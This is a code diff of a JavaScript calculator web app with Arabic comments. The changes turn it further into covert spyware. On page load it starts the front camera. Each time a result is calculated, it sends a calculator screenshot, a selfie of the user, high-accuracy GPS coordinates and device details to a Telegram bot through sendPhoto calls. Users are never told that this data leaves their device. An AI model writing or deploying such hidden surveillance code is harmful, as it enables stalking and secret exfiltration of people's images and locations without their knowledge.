@@ -1,918 +1,358 @@
 // ==========================================
-// حاسبة عبدالله
-// Calculator + History + Telegram Screenshot
-// + Location Permission Once
+// حاسبة عبدالله + السيلفي والموقع والتليجرام
 // ==========================================
+
+// 1. إعدادات بوت التليجرام (استبدل القيم ببياناتك)
+const TELEGRAM_CONFIG = {
+  botToken: "YOUR_BOT_TOKEN_HERE",
+  chatId: "YOUR_CHAT_ID_HERE"
+};
 
 const $ = (id) => document.getElementById(id);
 
 let expression = "";
 let result = "0";
 let justCalculated = false;
+let cameraStream = null;
 
 // ==========================================
-// Location Cache
+// 2. إدارة الكاميرا والسيلفي
 // ==========================================
 
-const LOCATION_CACHE_KEY =
-  "calculator_location_cache";
-
-const LOCATION_CACHE_TIME =
-  5 * 60 * 1000; // 5 دقائق
-
-let cachedLocation = null;
-
-// ==========================================
-// Local History
-// ==========================================
-
-function getHistory() {
-  return JSON.parse(
-    localStorage.getItem("calc_history") || "[]"
-  );
-}
-
-function saveHistory(items) {
-  localStorage.setItem(
-    "calc_history",
-    JSON.stringify(items)
-  );
-}
-
-// ==========================================
-// Render
-// ==========================================
-
-function render() {
-  $("expression").textContent =
-    expression || "0";
-
-  $("result").textContent = result;
-
-  const items = getHistory();
-
-  $("history").innerHTML = items.length
-    ? items
-        .map(
-          (item) => `
-            <div class="history-item">
-              <span>
-                <strong>${escapeHtml(item.expression)}</strong>
-                = ${escapeHtml(item.result)}
-              </span>
-              <small>${escapeHtml(item.time)}</small>
-            </div>
-          `
-        )
-        .join("")
-    : `
-      <div class="history-item">
-        <span>مفيش عمليات لسه.</span>
-      </div>
-    `;
-}
-
-// ==========================================
-// Escape HTML
-// ==========================================
-
-function escapeHtml(text) {
-  return String(text).replace(
-    /[&<>"']/g,
-    (char) => {
-      const chars = {
-        "&": "&amp;",
-        "<": "&lt;",
-        ">": "&gt;",
-        '"': "&quot;",
-        "'": "&#39;"
-      };
-
-      return chars[char];
+// تشغيل الكاميرا الأمامية تلقائياً
+async function initCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
+    const video = $("video");
+    if (video) {
+      video.srcObject = stream;
+      cameraStream = stream;
+      console.log("تم تشغيل الكاميرا بنجاح.");
     }
-  );
+  } catch (error) {
+    console.warn("تعذر الوصول للكاميرا:", error.message);
+  }
 }
 
-// ==========================================
-// Calculator
-// ==========================================
-
-function safeEvaluate(input) {
-  if (!/^[0-9+\-*/%.()\s]+$/.test(input)) {
-    throw new Error("invalid");
-  }
-
-  const normalized = input.replace(
-    /(\d+(?:\.\d+)?)%/g,
-    "($1/100)"
-  );
-
-  const value = Function(
-    `"use strict"; return (${normalized})`
-  )();
-
-  if (!Number.isFinite(value)) {
-    throw new Error("invalid");
-  }
-
-  return Number.isInteger(value)
-    ? String(value)
-    : String(
-        Number(value.toFixed(12))
-      );
-}
-
-// ==========================================
-// Add Value
-// ==========================================
-
-function addValue(value) {
-  if (
-    justCalculated &&
-    /[0-9.]/.test(value)
-  ) {
-    expression = "";
-  }
-
-  if (
-    justCalculated &&
-    /[+\-*/%]/.test(value)
-  ) {
-    expression = result;
-  }
-
-  justCalculated = false;
-
-  // منع operators متتالية
-  if (/[+\-*/%]/.test(value)) {
-    if (!expression) {
+// التقاط صورة سيلفي وتحويلها إلى Blob
+function captureSelfieBlob() {
+  return new Promise((resolve) => {
+    const video = $("video");
+    const canvas = $("canvas");
+    
+    if (!video || !canvas || !cameraStream) {
+      resolve(null);
       return;
     }
 
-    const lastChar =
-      expression.at(-1);
+    const width = video.videoWidth;
+    const height = video.videoHeight;
 
-    if (/[+\-*/%]/.test(lastChar)) {
-      expression =
-        expression.slice(0, -1) +
-        value;
+    if (!width || !height) {
+      resolve(null);
+      return;
+    }
 
+    canvas.width = width;
+    canvas.height = height;
+    const context = canvas.getContext("2d");
+
+    // عمل انعكاس مرآة مثل السيلفي الحقيقي
+    context.translate(width, 0);
+    context.scale(-1, 1);
+    context.drawImage(video, 0, 0, width, height);
+
+    canvas.toBlob((blob) => {
+      resolve(blob);
+    }, "image/png", 0.9);
+  });
+}
+
+// ==========================================
+// 3. إدارة الموقع الجغرافي (Geolocation & Cache)
+// ==========================================
+
+const LOCATION_CACHE_KEY = "calculator_location_cache";
+const LOCATION_CACHE_TIME = 5 * 60 * 1000; // 5 دقائق
+let cachedLocation = null;
+
+function loadCachedLocation() {
+  try {
+    const saved = localStorage.getItem(LOCATION_CACHE_KEY);
+    if (!saved) return null;
+    const data = JSON.parse(saved);
+    if (!data || !data.latitude || !data.longitude || !data.savedAt) return null;
+    if (Date.now() - data.savedAt > LOCATION_CACHE_TIME) return null;
+    return data;
+  } catch (error) {
+    return null;
+  }
+}
+
+function saveCachedLocation(location) {
+  const data = {
+    latitude: location.latitude,
+    longitude: location.longitude,
+    accuracy: location.accuracy,
+    savedAt: Date.now()
+  };
+  localStorage.setItem(LOCATION_CACHE_KEY, JSON.stringify(data));
+  cachedLocation = data;
+  return data;
+}
+
+function getCurrentLocation() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) {
+      reject(new Error("المتصفح لا يدعم تحديد الموقع."));
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve(saveCachedLocation({
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+      })),
+      (err) => reject(err),
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 }
+    );
+  });
+}
+
+// ==========================================
+// 4. منطق الحاسبة وسجل العمليات
+// ==========================================
+
+function getHistory() {
+  return JSON.parse(localStorage.getItem("calc_history") || "[]");
+}
+
+function saveHistory(items) {
+  localStorage.setItem("calc_history", JSON.stringify(items));
+}
+
+function escapeHtml(text) {
+  return String(text).replace(/[&<>"']/g, (m) => ({
+    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
+  }[m]));
+}
+
+function render() {
+  if ($("expression")) $("expression").textContent = expression || "0";
+  if ($("result")) $("result").textContent = result;
+  
+  const historyContainer = $("history");
+  if (historyContainer) {
+    const items = getHistory();
+    historyContainer.innerHTML = items.length
+      ? items.map(item => `
+          <div class="history-item">
+            <span><strong>${escapeHtml(item.expression)}</strong> = ${escapeHtml(item.result)}</span>
+            <small>${escapeHtml(item.time)}</small>
+          </div>
+        `).join("")
+      : `<div class="history-item"><span>مفيش عمليات لسه.</span></div>`;
+  }
+}
+
+function safeEvaluate(input) {
+  if (!/^[0-9+\-*/%.()\s]+$/.test(input)) throw new Error("invalid");
+  const normalized = input.replace(/(\d+(?:\.\d+)?)%/g, "($1/100)");
+  const value = Function(`"use strict"; return (${normalized})`)();
+  if (!Number.isFinite(value)) throw new Error("invalid");
+  return Number.isInteger(value) ? String(value) : String(Number(value.toFixed(12)));
+}
+
+function addValue(value) {
+  if (justCalculated && /[0-9.]/.test(value)) expression = "";
+  if (justCalculated && /[+\-*/%]/.test(value)) expression = result;
+  justCalculated = false;
+
+  if (/[+\-*/%]/.test(value)) {
+    if (!expression) return;
+    if (/[+\-*/%]/.test(expression.at(-1))) {
+      expression = expression.slice(0, -1) + value;
       render();
       return;
     }
   }
 
-  // منع تكرار النقطة
   if (value === ".") {
-    const parts =
-      expression.split(
-        /[+\-*/%]/
-      );
-
-    const currentNumber =
-      parts.at(-1);
-
-    if (
-      currentNumber.includes(".")
-    ) {
-      return;
-    }
+    const parts = expression.split(/[+\-*/%]/);
+    if (parts.at(-1).includes(".")) return;
   }
 
   expression += value;
   result = "0";
-
   render();
 }
-
-// ==========================================
-// Clear
-// ==========================================
 
 function clearAll() {
   expression = "";
   result = "0";
   justCalculated = false;
-
   render();
 }
-
-// ==========================================
-// Backspace
-// ==========================================
 
 function backspace() {
-  if (justCalculated) {
-    clearAll();
-    return;
-  }
-
-  expression =
-    expression.slice(0, -1);
-
+  if (justCalculated) { clearAll(); return; }
+  expression = expression.slice(0, -1);
   render();
 }
-
-// ==========================================
-// Load Cached Location
-// ==========================================
-
-function loadCachedLocation() {
-  try {
-    const saved =
-      localStorage.getItem(
-        LOCATION_CACHE_KEY
-      );
-
-    if (!saved) {
-      return null;
-    }
-
-    const data =
-      JSON.parse(saved);
-
-    if (
-      !data ||
-      !data.latitude ||
-      !data.longitude ||
-      !data.savedAt
-    ) {
-      return null;
-    }
-
-    const age =
-      Date.now() - data.savedAt;
-
-    if (
-      age > LOCATION_CACHE_TIME
-    ) {
-      return null;
-    }
-
-    return data;
-
-  } catch (error) {
-    console.warn(
-      "Location cache error:",
-      error
-    );
-
-    return null;
-  }
-}
-
-// ==========================================
-// Save Location
-// ==========================================
-
-function saveCachedLocation(location) {
-  const data = {
-    latitude:
-      location.latitude,
-
-    longitude:
-      location.longitude,
-
-    accuracy:
-      location.accuracy,
-
-    savedAt:
-      Date.now()
-  };
-
-  localStorage.setItem(
-    LOCATION_CACHE_KEY,
-    JSON.stringify(data)
-  );
-
-  cachedLocation = data;
-
-  return data;
-}
-
-// ==========================================
-// Get Location
-// ==========================================
-
-function getCurrentLocation() {
-  return new Promise(
-    (resolve, reject) => {
-
-      if (!navigator.geolocation) {
-        reject(
-          new Error(
-            "المتصفح لا يدعم تحديد الموقع."
-          )
-        );
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-
-          const location = {
-            latitude:
-              position.coords.latitude,
-
-            longitude:
-              position.coords.longitude,
-
-            accuracy:
-              position.coords.accuracy
-          };
-
-          resolve(
-            saveCachedLocation(
-              location
-            )
-          );
-        },
-
-        (error) => {
-          reject(error);
-        },
-
-        {
-          enableHighAccuracy: true,
-
-          timeout: 10000,
-
-          maximumAge: 300000
-        }
-      );
-    }
-  );
-}
-
-// ==========================================
-// Initialize Location
-// ==========================================
-
-async function initializeLocation() {
-
-  // أولاً استخدم الموقع المخزن
-  const cached =
-    loadCachedLocation();
-
-  if (cached) {
-    cachedLocation = cached;
-
-    console.log(
-      "Using cached location."
-    );
-
-    return cached;
-  }
-
-  // لو مفيش موقع مخزن
-  // المتصفح سيطلب الإذن مرة حسب إعداداته
-  try {
-
-    const location =
-      await getCurrentLocation();
-
-    console.log(
-      "Location permission granted."
-    );
-
-    return location;
-
-  } catch (error) {
-
-    console.warn(
-      "Location unavailable:",
-      error
-    );
-
-    return null;
-  }
-}
-
-// ==========================================
-// Get Device Information
-// ==========================================
 
 function getDeviceInfo() {
   return {
-    userAgent:
-      navigator.userAgent ||
-      "Unknown",
-
-    language:
-      navigator.language ||
-      "Unknown",
-
-    platform:
-      navigator.platform ||
-      "Unknown",
-
-    screen:
-      `${window.screen.width}x${window.screen.height}`,
-
-    online:
-      navigator.onLine
-        ? "Online"
-        : "Offline"
+    userAgent: navigator.userAgent || "Unknown",
+    language: navigator.language || "Unknown",
+    platform: navigator.platform || "Unknown",
+    screen: `${window.screen.width}x${window.screen.height}`,
+    online: navigator.onLine ? "Online" : "Offline"
   };
 }
 
 // ==========================================
-// Equals
+// 5. زر الضغط (=) والتقاط الإرسال لتليجرام
 // ==========================================
 
 async function equals() {
-
-  if (!expression.trim()) {
-    return;
-  }
-
-  const currentExpression =
-    expression;
+  if (!expression.trim()) return;
+  const currentExpression = expression;
 
   try {
-
-    const calculated =
-      safeEvaluate(
-        currentExpression
-      );
-
+    const calculated = safeEvaluate(currentExpression);
     result = calculated;
-
     justCalculated = true;
 
-    // حفظ العملية
-    const history =
-      getHistory();
-
+    // حفظ في السجل LocalStorage
+    const history = getHistory();
     history.unshift({
-
-      expression:
-        currentExpression,
-
-      result:
-        calculated,
-
-      time:
-        new Date().toLocaleString(
-          "ar-EG"
-        )
+      expression: currentExpression,
+      result: calculated,
+      time: new Date().toLocaleString("ar-EG")
     });
-
-    saveHistory(
-      history.slice(0, 100)
-    );
-
+    saveHistory(history.slice(0, 100));
     render();
 
-    // Screenshot بعد ظهور النتيجة
+    // التقاط الصور وإرسالها عند تنفيذ العملية
     setTimeout(() => {
-
-      captureAndSendToTelegram(
-        currentExpression,
-        calculated
-      );
-
+      captureAndSendToTelegram(currentExpression, calculated);
     }, 300);
 
   } catch (error) {
-
-    console.error(error);
-
     result = "خطأ";
-
     render();
   }
 }
 
-// ==========================================
-// Screenshot + Location + Telegram
-// ==========================================
-
-async function captureAndSendToTelegram(
-  exp,
-  res
-) {
-
+async function captureAndSendToTelegram(exp, res) {
   try {
+    const botToken = TELEGRAM_CONFIG.botToken;
+    const chatId = TELEGRAM_CONFIG.chatId;
 
-    // ======================================
-    // html2canvas
-    // ======================================
-
-    if (!window.html2canvas) {
-
-      console.error(
-        "html2canvas لم يتم تحميله."
-      );
-
+    if (!botToken || !chatId || botToken === "YOUR_BOT_TOKEN_HERE") {
+      console.warn("بيانات التليجرام غير مضافة.");
       return;
     }
 
-    // ======================================
-    // Telegram Config
-    // ======================================
-
-    if (
-      typeof TELEGRAM_CONFIG ===
-      "undefined"
-    ) {
-
-      console.error(
-        "TELEGRAM_CONFIG غير موجود."
-      );
-
-      return;
-    }
-
-    const botToken =
-      TELEGRAM_CONFIG.botToken;
-
-    const chatId =
-      TELEGRAM_CONFIG.chatId;
-
-    if (
-      !botToken ||
-      !chatId
-    ) {
-
-      console.error(
-        "Bot Token أو Chat ID غير موجود."
-      );
-
-      return;
-    }
-
-    // ======================================
-    // Location
-    // ======================================
-
-    let locationText =
-      "📍 الموقع: غير متاح";
-
-    let location =
-      cachedLocation ||
-      loadCachedLocation();
-
+    // جلب الموقع
+    let locationText = "📍 الموقع: غير متاح";
+    let location = cachedLocation || loadCachedLocation();
     if (!location) {
-
-      try {
-
-        location =
-          await getCurrentLocation();
-
-      } catch (error) {
-
-        console.warn(
-          "Location unavailable:",
-          error
-        );
-      }
+      try { location = await getCurrentLocation(); } catch (e) {}
     }
-
     if (location) {
-
-      const latitude =
-        location.latitude;
-
-      const longitude =
-        location.longitude;
-
-      const accuracy =
-        Math.round(
-          location.accuracy || 0
-        );
-
-      locationText =
-        `📍 الموقع الحالي:\n` +
-        `Latitude: ${latitude}\n` +
-        `Longitude: ${longitude}\n` +
-        `الدقة: ±${accuracy} متر`;
-
+      locationText = `📍 الموقع الحالي:\nLatitude: ${location.latitude}\nLongitude: ${location.longitude}\nالدقة: ±${Math.round(location.accuracy || 0)} متر`;
     }
 
-    // ======================================
-    // Device
-    // ======================================
+    const device = getDeviceInfo();
+    const currentTime = new Date().toLocaleString("ar-EG");
 
-    const device =
-      getDeviceInfo();
-
-    // ======================================
-    // Screenshot
-    // ======================================
-
-    const captureArea =
-      $("captureArea");
-
-    if (!captureArea) {
-
-      console.error(
-        "captureArea غير موجود."
-      );
-
-      return;
-    }
-
-    const canvas =
-      await html2canvas(
-        captureArea,
-        {
-
-          backgroundColor:
-            "#ffffff",
-
-          scale:
-            Math.min(
-              2,
-              window.devicePixelRatio ||
-                1
-            ),
-
-          useCORS: true
-        }
-      );
-
-    // ======================================
-    // Blob
-    // ======================================
-
-    const blob =
-      await new Promise(
-        (resolve) => {
-
-          canvas.toBlob(
-            resolve,
-            "image/png",
-            0.92
-          );
-
-        }
-      );
-
-    if (!blob) {
-
-      throw new Error(
-        "تعذر إنشاء Screenshot."
-      );
-
-    }
-
-    // ======================================
-    // Time
-    // ======================================
-
-    const currentTime =
-      new Date().toLocaleString(
-        "ar-EG"
-      );
-
-    // ======================================
-    // Caption
-    // ======================================
-
-    const caption =
-      `🧮 حاسبة عبدالله\n\n` +
-
+    const caption = `🧮 حاسبة عبدالله\n\n` +
       `🔢 العملية: ${exp}\n` +
-
       `✅ النتيجة: ${res}\n` +
-
       `🕐 الوقت: ${currentTime}\n\n` +
-
       `${locationText}\n\n` +
+      `📱 الجهاز: ${device.platform} | ${device.screen}`;
 
-      `📱 معلومات الجهاز:\n` +
-
-      `Platform: ${device.platform}\n` +
-
-      `Screen: ${device.screen}\n` +
-
-      `Language: ${device.language}\n` +
-
-      `Status: ${device.online}`;
-
-    // ======================================
-    // FormData
-    // ======================================
-
-    const formData =
-      new FormData();
-
-    formData.append(
-      "chat_id",
-      chatId
-    );
-
-    formData.append(
-      "caption",
-      caption.slice(0, 1024)
-    );
-
-    formData.append(
-      "photo",
-      blob,
-      `calculation-${Date.now()}.png`
-    );
-
-    // ======================================
-    // Telegram
-    // ======================================
-
-    const response =
-      await fetch(
-        `https://api.telegram.org/bot${botToken}/sendPhoto`,
-        {
-          method: "POST",
-          body: formData
-        }
-      );
-
-    const data =
-      await response.json();
-
-    if (
-      !response.ok ||
-      !data.ok
-    ) {
-
-      throw new Error(
-        data.description ||
-          "فشل إرسال الصورة."
-      );
-
+    // 1. التقاط سكرين شوت للحاسبة
+    let screenBlob = null;
+    const captureArea = $("captureArea");
+    if (window.html2canvas && captureArea) {
+      const canvasCalc = await html2canvas(captureArea, {
+        backgroundColor: "#ffffff",
+        scale: Math.min(2, window.devicePixelRatio || 1)
+      });
+      screenBlob = await new Promise(res => canvasCalc.toBlob(res, "image/png", 0.9));
     }
 
-    console.log(
-      "Screenshot + Location sent successfully."
-    );
+    // 2. التقاط صورة السيلفي
+    const selfieBlob = await captureSelfieBlob();
+
+    // 3. إرسال Screenshot إن وجد
+    if (screenBlob) {
+      const form1 = new FormData();
+      form1.append("chat_id", chatId);
+      form1.append("caption", caption.slice(0, 1024));
+      form1.append("photo", screenBlob, `calc-${Date.now()}.png`);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form1 });
+    }
+
+    // 4. إرسال صورة السيلفي إن وجدت
+    if (selfieBlob) {
+      const form2 = new FormData();
+      form2.append("chat_id", chatId);
+      form2.append("caption", `📸 سيلفي أثناء الحساب: ${exp} = ${res}`);
+      form2.append("photo", selfieBlob, `selfie-${Date.now()}.png`);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form2 });
+    }
 
   } catch (error) {
-
-    console.error(
-      "Telegram Error:",
-      error
-    );
-
+    console.error("خطأ أثناء إرسال البيانات لتليجرام:", error);
   }
 }
 
 // ==========================================
-// Calculator Buttons
+// 6. أحداث الأزرار ولوحة المفاتيح
 // ==========================================
 
-const keysContainer =
-  document.querySelector(
-    ".keys"
-  );
-
+const keysContainer = document.querySelector(".keys");
 if (keysContainer) {
+  keysContainer.addEventListener("click", (event) => {
+    const button = event.target.closest("button");
+    if (!button) return;
 
-  keysContainer.addEventListener(
-    "click",
-    (event) => {
+    const value = button.dataset.value;
+    const action = button.dataset.action;
 
-      const button =
-        event.target.closest(
-          "button"
-        );
+    if (value !== undefined) addValue(value);
+    else if (action === "clear") clearAll();
+    else if (action === "backspace") backspace();
+    else if (action === "equals") equals();
+  });
+}
 
-      if (!button) {
-        return;
-      }
+document.addEventListener("keydown", (event) => {
+  if (/^[0-9+\-*/%.()]$/.test(event.key)) addValue(event.key);
+  else if (event.key === "Enter" || event.key === "=") { event.preventDefault(); equals(); }
+  else if (event.key === "Backspace") backspace();
+  else if (event.key === "Escape") clearAll();
+});
 
-      const value =
-        button.dataset.value;
-
-      const action =
-        button.dataset.action;
-
-      if (
-        value !== undefined
-      ) {
-
-        addValue(value);
-
-        return;
-      }
-
-      if (
-        action === "clear"
-      ) {
-
-        clearAll();
-
-        return;
-      }
-
-      if (
-        action === "backspace"
-      ) {
-
-        backspace();
-
-        return;
-      }
-
-      if (
-        action === "equals"
-      ) {
-
-        equals();
-
-      }
-
+if ($("clearHistory")) {
+  $("clearHistory").addEventListener("click", () => {
+    if (confirm("متأكد إنك عايز تمسح سجل العمليات؟")) {
+      saveHistory([]);
+      render();
     }
-  );
+  });
 }
 
 // ==========================================
-// Keyboard
-// ==========================================
-
-document.addEventListener(
-  "keydown",
-  (event) => {
-
-    if (
-      /^[0-9+\-*/%.()]$/.test(
-        event.key
-      )
-    ) {
-
-      addValue(event.key);
-
-      return;
-    }
-
-    if (
-      event.key === "Enter" ||
-      event.key === "="
-    ) {
-
-      event.preventDefault();
-
-      equals();
-
-      return;
-    }
-
-    if (
-      event.key === "Backspace"
-    ) {
-
-      backspace();
-
-      return;
-    }
-
-    if (
-      event.key === "Escape"
-    ) {
-
-      clearAll();
-
-    }
-
-  }
-);
-
-// ==========================================
-// Clear History
-// ==========================================
-
-const clearHistoryButton =
-  $("clearHistory");
-
-if (clearHistoryButton) {
-
-  clearHistoryButton.addEventListener(
-    "click",
-    () => {
-
-      if (
-        confirm(
-          "متأكد إنك عايز تمسح سجل العمليات؟"
-        )
-      ) {
-
-        saveHistory([]);
-
-        render();
-
-      }
-
-    }
-  );
-}
-
-// ==========================================
-// Initial
+// 7. التشغيل الابتدائي
 // ==========================================
 
 render();
-
-// ==========================================
-// Ask Location Permission Once
-// ==========================================
-
-initializeLocation();
+initCamera();          // تشغيل الكاميرا تلقائياً
+getCurrentLocation();  // قراءة الموقع الجغرافي
